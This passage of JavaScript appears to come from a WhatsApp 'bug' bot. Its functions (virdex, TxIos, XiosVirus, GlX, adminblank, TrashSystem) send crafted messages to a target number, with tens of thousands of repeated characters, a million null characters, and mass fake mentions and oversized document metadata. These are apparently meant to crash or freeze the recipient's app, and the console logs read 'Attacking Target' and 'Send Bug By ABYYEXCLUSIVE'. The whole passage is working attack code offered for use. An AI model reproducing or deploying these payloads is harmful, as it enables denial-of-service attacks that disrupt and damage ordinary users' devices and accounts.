							conversionSource: " X ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " X ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " X "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "DELETE",
								body: "DEL BUGSϟ",
								mediaType: "./image/dev.jpg",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "https://www.instagram.com/whatsapp",
								mediaUrl: "https://www.instagram.com/whatsapp",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "https://www.instagram.com/whatsapp"
							},
							groupSubject: " X ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " X ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " X ",
								utmCampaign: " X "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("DELETE BUGS ⚡"));
		};
		
		async function virdex(target, ptcp = false) {
			await byxz.relayMessage(target, {
					"extendedTextMessage": {
						"text": "⭑𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲̤" + "ꦾ".repeat(50000),
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "6282291664759@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "6282291664759@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6282291664759@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "",
								"body": "",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("Attacking Target ⚡"));
		};
		
		async function TxIos(target, ptcp = false) {
			await byxz.relayMessage(target, {
					"extendedTextMessage": {
						"text": "⭑𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "6282291664759@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "6282291664759@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6282291664759@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "",
								"body": "",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("Attacking Target ⚡"));
		};
		
		async function XiosVirus(target) {
			byxz.relayMessage(target, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': target,
						'participant': target,
						'quotedMessage': {
							'conversation': '𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': target
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Send Bug By ABYYEXCLUSIVE"));
		};
		
		async function GlX(target, ptcp = true) {
			await byxz.relayMessage(target, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "𝐀𝐁𝐘𝐘𝐄𝐗𝐂𝐋𝐔𝐒𝐈𝐕𝐄〽️",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By ABYYEXCLUSIVE〽️"));
		};
		
		async function adminblank(target) {
			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "⚡𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲🐉" + "ꦾ".repeat(92000),
							"jpegThumbnail": "",
							"caption": "𝐁𝐲𝐱𝐱𝐇𝐚𝐫𝐝𝐞𝐫🐉" + "ꦾ".repeat(55000),
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': target
			});
			await byxz.relayMessage(target, messageContent.message, {
				'participant': {
					'jid': target
				},
				'messageId': messageContent.key.id
			});
		}
		
		async function TrashSystem(target, ptcp = true) {
			await byxz.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: wantuyd,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️\n" + "@6282291664759".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/JACKTHEXBEC\", merchant_url: \"https://youtube.com/JACKTHEXBEC\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6282291664759@s.whatsapp.net", ...Array.from({
										length: 30000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐀𝐁𝐘𝐘𝐄𝐗𝐂𝐋𝐔𝐒𝐈𝐕𝐄 𝐁𝐔𝐆 𝐕𝟕〽️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By ABYYEXCLUSIVE 〽️"));
		};
		
		async function glxycall(target, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
